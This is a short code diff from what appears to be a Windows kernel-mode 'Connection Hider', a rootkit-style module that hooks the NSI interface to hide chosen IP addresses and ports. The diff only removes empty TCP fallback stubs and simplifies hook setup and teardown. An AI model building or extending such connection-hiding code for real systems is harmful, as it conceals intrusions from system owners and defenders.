@@ -4,24 +4,11 @@
 NetHook::PNET_CONNECTION_ENTRY g_NetworkLinkedListHead = NULL;
 NetHook::PNET_CONNECTION_ENTRY g_NetworkLinkedListTail = NULL;
 
-static NTSTATUS NetHookTCPProxy()
-{
-	return NTSTATUS();
-}
-
-static VOID NetFreeTCPDriver()
-{
-	return;
-}
 NTSTATUS NetHook::InitNetworkHook()
 {
 	KdPrint(("Initializing Connection Hider..."));
 
 	NTSTATUS status{ NsiHook::NetHookNSIProxy() };
-	if (!NT_SUCCESS(status))
-	{
-		status = NetHookTCPProxy();
-	}
 
 	return status;
 }
@@ -138,11 +125,8 @@ BOOLEAN NetHook::NetIsHiddenIpAddress(ULONG IpAddress, USHORT PortNumber, ULONG 
 
 VOID NetHook::UnHookNetworkProxy()
 {
-	if (!NsiHook::NetNSIFreeHook())
-	{
-		NetFreeTCPDriver();
-	}
-
+	NsiHook::NetNSIFreeHook();
+	
 	while (g_NetworkLinkedListHead)
 	{
 		PNET_CONNECTION_ENTRY TempPtr = g_NetworkLinkedListHead->NextEntry;
